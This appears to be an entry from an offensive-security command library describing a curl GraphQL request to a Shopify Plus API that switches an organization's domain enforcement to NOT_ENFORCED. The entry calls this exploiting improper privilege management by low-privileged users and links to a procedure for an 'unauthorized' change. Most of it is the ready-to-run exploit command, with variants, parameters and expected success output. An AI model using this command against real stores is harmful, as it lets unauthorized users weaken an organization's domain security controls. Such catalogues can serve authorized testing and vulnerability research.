---
data: >-
  curl -X POST https://shopify.plus/34946971/stores/api -H "Content-Type:
  application/json" -H "Authorization: Bearer YOUR_TOKEN" -d '{"query":"mutation
  { changeDomainEnforcementState(domainIds:
  [\"gid://shopify/OrganizationDomain/123\"],enforcementState:NOT_ENFORCED) {
  organization { id domains { id domainName status verified __typename }
  __typename } userErrors { field message __typename } __typename } }"}'
tags:
  - graphql
  - mutation
  - shopify
type: command
output: null
executor: bash
platforms:
  - Web
  - Cloud
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:36.324Z'
id: f3425984-1f45-4589-b90a-eab3c18123b3
verified: false
validated: true
submitted: true
---
# shopify-graphql-mutation-change-domain-enforcement

## Command

```bash
curl -X POST https://shopify.plus/34946971/stores/api \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{"query":"mutation { changeDomainEnforcementState(domainIds: [\"gid://shopify/OrganizationDomain/123\"],enforcementState:NOT_ENFORCED) { organization { id domains { id domainName status verified __typename } __typename } userErrors { field message __typename } __typename } }"}'
```

## Description

GraphQL mutation to change domain enforcement state to NOT_ENFORCED in Shopify Plus, exploiting improper privilege management for low-priv users.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method | Yes |
| `https://shopify.plus/:org_id/stores/api` | API endpoint | Yes |
| `-H "Authorization: Bearer YOUR_TOKEN"` | Auth token | Yes |
| `domainIds` | Array of domain IDs (e.g., ["gid://..."]) | Yes |
| `enforcementState` | State to set (NOT_ENFORCED) | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://shopify.plus/34946971/stores/api -H "Content-Type: application/json" -H "Authorization: Bearer token" -d '{"query":"mutation { changeDomainEnforcementState(domainIds: [\"gid://shopify/OrganizationDomain/123\"],enforcementState:NOT_ENFORCED) { ... } }"}'
```

### Advanced Usage

Test with ENFORCED state by changing enforcementState value:

```bash
curl -X POST https://shopify.plus/34946971/stores/api -H "Content-Type: application/json" -H "Authorization: Bearer token" -d '{"query":"mutation { changeDomainEnforcementState(domainIds: [\"gid://shopify/OrganizationDomain/123\"],enforcementState:ENFORCED) { ... } }"}'
```

## Expected Output

{"data":{"changeDomainEnforcementState":{"organization":{"domains":[{"id":"gid://...","status":"NOT_ENFORCED"}]},"userErrors":[]}}}. userErrors array empty on success.

## Related

- [[commands/shopify-graphql-query-organization-domains]]
- [[procedures/Execute-Unauthorized-Domain-Enforcement-Change]]
